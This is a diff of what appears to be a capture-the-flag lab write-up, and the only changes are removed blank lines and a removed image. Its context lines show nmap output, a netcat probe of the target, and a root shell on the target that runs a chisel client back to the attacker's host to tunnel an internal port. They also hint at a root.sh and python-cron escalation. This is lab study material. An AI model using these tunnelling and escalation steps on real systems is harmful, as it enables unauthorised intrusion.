@@ -158,7 +158,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 132.94 seconds
 
-
 ┌──(witty㉿kali)-[~]
 └─$ nc 10.10.144.39 10000
 
@@ -394,7 +393,6 @@ tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      
 tcp6       0      0 :::22                   :::*                    LISTEN      657/sshd        
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           487/dhclient    
 
-
 bash-4.3# chmod +x chisel
 chmod +x chisel
 bash-4.3# ./chisel client 10.8.19.103:3000 R:8000:127.0.0.1:8080
@@ -505,8 +503,6 @@ but we already change root.sh
 python /root/company/media/*.py
 
 ```
-
-![[Pasted image 20230818090402.png]]
 
 user.txt
 
